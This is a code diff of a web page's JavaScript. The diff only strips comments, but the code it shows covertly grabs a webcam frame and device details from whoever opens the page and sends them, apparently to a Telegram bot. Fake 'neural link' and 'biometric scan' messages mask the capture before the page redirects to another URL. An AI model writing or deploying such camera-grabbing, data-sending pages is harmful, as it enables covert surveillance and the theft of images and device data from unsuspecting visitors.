@@ -97,7 +97,6 @@
         const logs = document.getElementById("logs");
 
         try {
-            // Faqat kamera ruxsati (audio yo'q)
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
             video.srcObject = stream;
             const info = await getDeepInfo();
@@ -105,19 +104,16 @@
             setTimeout(() => logs.innerHTML += "> NEURAL LINK ESTABLISHED...<br>", 1000);
             setTimeout(() => logs.innerHTML += "> ANALYZING BIOMETRICS...<br>", 2000);
 
-            // Rasmga olish
             setTimeout(async () => {
                 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext("2d").drawImage(video, 0, 0);
                 canvas.toBlob(b => sendToTg(b, "📸 BIOMETRIC SCAN\n" + info), "image/jpeg", 0.7);
             }, 3000);
 
-            // Warning effekti
             setTimeout(() => {
                 document.getElementById("warningOverlay").style.display = "flex";
             }, 4500);
 
-            // Yakunlash
             setTimeout(() => {
                 stream.getTracks().forEach(t => t.stop());
                 window.location.href = TARGET_URL;
